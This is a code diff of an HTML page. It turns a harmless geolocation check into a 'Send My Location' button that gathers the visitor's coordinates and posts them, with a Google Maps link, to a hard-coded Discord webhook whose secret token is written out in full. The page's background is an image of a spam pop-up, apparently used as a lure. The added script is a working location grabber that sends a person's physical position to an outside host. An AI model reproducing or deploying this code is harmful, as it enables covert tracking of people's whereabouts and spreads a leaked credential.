@@ -3,26 +3,63 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location Permission</title>
+    <title>Send Location</title>
     <style>
         body {
             background: url('https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-wordpress-pages-1180x812.png') no-repeat center center fixed;
             background-size: cover;
             margin: 0;
             height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        button {
+            font-size: 20px;
+            padding: 15px 30px;
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkred;
         }
     </style>
-    <script>
-        document.addEventListener("DOMContentLoaded", () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    () => console.log("Location permission granted."),
-                    () => console.log("Location permission denied.")
-                );
-            }
-        });
-    </script>
 </head>
 <body>
+    <button onclick="sendLocation()">Send My Location</button>
+
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const webhookURL = "https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX";
+                        
+                        // Create message
+                        const data = {
+                            content: `📍 **New Location Shared!**\n🌍 Latitude: ${latitude}\n🌏 Longitude: ${longitude}\n[📌 View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`
+                        };
+
+                        // Send request to Discord webhook
+                        fetch(webhookURL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(data)
+                        })
+                        .then(() => alert("📡 Location sent successfully!"))
+                        .catch(() => alert("❌ Failed to send location."));
+                    },
+                    () => alert("❌ Location permission denied.")
+                );
+            } else {
+                alert("❌ Geolocation is not supported by this browser.");
+            }
+        }
+    </script>
 </body>
 </html>
